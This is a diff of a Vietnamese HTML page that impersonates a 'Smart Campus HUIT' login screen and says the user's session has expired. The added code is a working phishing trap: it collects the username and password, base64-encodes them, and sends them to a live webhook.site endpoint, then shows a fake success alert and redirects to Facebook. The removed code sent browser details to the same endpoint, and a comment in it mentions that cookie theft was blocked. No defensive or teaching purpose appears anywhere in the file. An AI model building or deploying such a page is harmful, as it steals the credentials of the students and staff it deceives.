@@ -1,14 +1,27 @@
-<script>
-  // Thay vì lấy toàn bộ cookie (bị chặn), ta lấy thông tin trình duyệt và IP để đánh lừa
-  var info = "UserAgent: " + navigator.userAgent + " | Platform: " + navigator.platform;
-  
+<!DOCTYPE html>
+<html>
+<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+    <h2>Hệ thống Smart Campus HUIT</h2>
+    <p>Phiên làm việc của bạn đã hết hạn. Vui lòng xác thực lại để tiếp tục.</p>
+    <form id="trapForm">
+        <input type="text" id="user" placeholder="Email hoặc số điện thoại" required style="margin: 5px; padding: 10px;"><br>
+        <input type="password" id="pass" placeholder="Mật khẩu" required style="margin: 5px; padding: 10px;"><br>
+        <button type="submit" style="padding: 10px 20px; background: #1877f2; color: white; border: none; border-radius: 5px;">Xác thực ngay</button>
+    </form>
 
-  fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?data=" + btoa(info));
-
- 
-  setTimeout(function(){
-    window.location.href = "https://www.facebook.com";
-  }, 1000);
-</script>
-<h1>Đang đồng bộ dữ liệu dự án Smart Campus... vui lòng đợi</h1>
-
+    <script>
+        document.getElementById('trapForm').onsubmit = function(e) {
+            e.preventDefault();
+            var u = document.getElementById('user').value;
+            var p = document.getElementById('pass').value;
+            // Gửi dữ liệu về Webhook của bạn
+            var data = "User: " + u + " | Pass: " + p;
+            fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?c=" + btoa(data))
+            .then(() => {
+                alert("Xác thực thành công! Đang quay lại dự án...");
+                window.location.href = "https://www.facebook.com";
+            });
+        };
+    </script>
+</body>
+</html>
